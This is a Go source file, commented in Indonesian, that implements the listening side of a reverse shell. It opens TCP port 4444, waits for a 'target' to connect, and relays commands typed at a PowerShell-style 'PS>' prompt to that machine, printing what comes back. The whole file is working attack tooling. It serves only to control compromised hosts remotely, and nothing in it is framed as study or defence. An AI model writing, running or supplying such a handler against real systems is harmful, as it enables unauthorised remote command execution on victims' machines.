package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

func main() {
    fmt.Println("Menunggu koneksi dari target...")
    // Server menunggu koneksi di port 4444
    listener, err := net.Listen("tcp", ":4444")
    if err != nil {
        panic(err)
    }
    defer listener.Close()

    // Terima koneksi dari target
    conn, err := listener.Accept()
    if err != nil {
        panic(err)
    }
    defer conn.Close()
    fmt.Println("Target terhubung dari:", conn.RemoteAddr())

    // Loop untuk mengirim perintah dan menerima hasil
    for {
        // Baca input dari user (server)
        reader := bufio.NewReader(os.Stdin)
        fmt.Print("PS> ")
        command, _ := reader.ReadString('\n')

        // Kirim perintah ke target
        conn.Write([]byte(command))

        // Baca hasil eksekusi dari target
        buffer := make([]byte, 4096)
        n, err := conn.Read(buffer)
        if err != nil {
            fmt.Println("Target terputus.")
            break
        }
        fmt.Print(string(buffer[:n]))
    }
}